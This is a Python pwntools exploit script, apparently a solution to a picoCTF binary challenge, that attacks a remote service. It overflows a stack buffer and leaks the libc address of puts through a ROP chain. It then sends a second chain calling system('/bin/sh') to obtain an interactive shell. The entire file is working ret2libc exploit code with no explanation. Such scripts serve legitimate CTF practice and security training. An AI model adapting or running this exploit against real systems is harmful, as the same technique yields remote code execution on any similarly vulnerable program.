from pwn import *

elf = context.binary = ELF("./vuln")
libc = ELF("./libc/libc.so.6")
rop = ROP([elf])

# p = gdb.debug(elf.path, '''
# b *do_stuff+152
# c
# ''')
# p = process(elf.path)
p = remote('mercury.picoctf.net', 42072)

# payload = cyclic(264)
# p.sendline(payload)


OFFSET = 136
DO_STUFF = elf.sym['do_stuff']
PUTS_GOT = elf.got['puts']
PUTS_PLT = elf.plt['puts']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]


print(f"[+] BOF on {hex(OFFSET)}")
print(f"[+] DO_STUFF func {hex(DO_STUFF)}")
print(f"[+] PUTS_GOT func {hex(PUTS_GOT)}")
print(f"[+] PUTS_PLT func {hex(PUTS_PLT)}")
print(f"[+] POP_RDI func {hex(POP_RDI)}")
print(f"[+] RET func {hex(RET)}")


payload = b'A' * OFFSET
payload += p64(POP_RDI)
payload += p64(PUTS_GOT)
payload += p64(PUTS_PLT)
payload += p64(DO_STUFF)



p.sendline(payload)
print(p.recvline())
print(p.recvline())
PUTS_LEAKED = p.recvline().strip()
print(PUTS_LEAKED)
PUTS_LEAKED = u64(PUTS_LEAKED.ljust(8, b"\x00"))
print(f"[+] PUTS_LEAKED {hex(PUTS_LEAKED)}")
print(f"[+] libc puts {hex(libc.symbols['puts'])}")

libc_base = PUTS_LEAKED - libc.symbols["puts"]
libc.address = libc_base
print(f"[+] libc base {hex(libc.address)}")

BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]
print(f"[+] BINSH func {hex(BINSH)}")
print(f"[+] SYSTEM func {hex(SYSTEM)}")
print(f"[+] EXIT func {hex(EXIT)}")

payload = b'A' * OFFSET
payload += p64(RET) # align stack
payload += p64(POP_RDI)
payload += p64(BINSH)
payload += p64(SYSTEM)
payload += p64(EXIT)
p.sendline(payload)

p.interactive()
